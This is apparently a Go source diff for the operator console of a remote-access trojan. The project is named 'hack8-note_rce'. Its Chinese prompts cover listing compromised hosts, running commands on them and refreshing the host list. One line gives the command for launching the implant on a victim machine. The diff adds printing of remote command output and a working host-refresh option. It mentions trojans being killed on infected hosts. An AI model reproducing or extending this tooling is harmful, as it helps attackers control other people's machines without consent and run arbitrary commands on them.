@@ -2,25 +2,24 @@ package main
 
 import (
 	"fmt"
-	"github.com/lifei6671/gorand"
 	"hack8-note_rce/Util"
 )
 
 func main() {
 	var admin string
+	fmt.Println("被控端运行命令 key参数制定notekey admin参数制定主控地址（建议更改） ：\n./server --key notekey --admin ocis")
+
 	fmt.Println("请输入主控地址(默认为ocis)：")
 	fmt.Scan(&admin)
 
-	fmt.Println("被控端运行命令 key参数制定notekey admin参数执行主控 ：\n./server --key notekey --")
-
 	for {
 		console := 0
-		fmt.Println("\n\n1.获取在线主机列表(不一定全)\n2.执行主机命令(需要等待30秒)\n3.删除主机(可能主机被控木马已被杀掉,列表不会自动删除,需要手动删除)\n")
+		fmt.Println("\n\n1.被控端列表(被控端失联后不会自动更新)\n2.执行主机命令\n3.更新被控端列表(需等待30秒)\n")
 		fmt.Scan(&console)
 		if console == 1 {
 			list := Util.HostList(admin)
 			for i := range list {
-				fmt.Printf("%v:主机名:[%v]\x09note地址:[%v]\x09notekey地址:[%v]\n", i, list[i].HostName, list[i].Id, list[i].Notekey)
+				fmt.Printf("%v:主机名:[%v]\x09note地址:[%v]\x09notekey:[%v]\n", i, list[i].HostName, list[i].Id, list[i].Notekey)
 			}
 		} else if console == 2 {
 			var noteid string
@@ -35,11 +34,11 @@ func main() {
 			fmt.Scan(&command)
 			fmt.Println("请等待30秒")
 
-			Util.Hostexec(noteid, notekey, command)
-
+			res := Util.Hostexec(noteid, notekey, command)
+			fmt.Println(res)
 		} else if console == 3 {
-			fmt.Println("功能暂未开发")
-
+			Util.RefreshHost(admin)
+			fmt.Println("刷新成功")
 		} else {
 			fmt.Println("功能暂未开发")
 		}
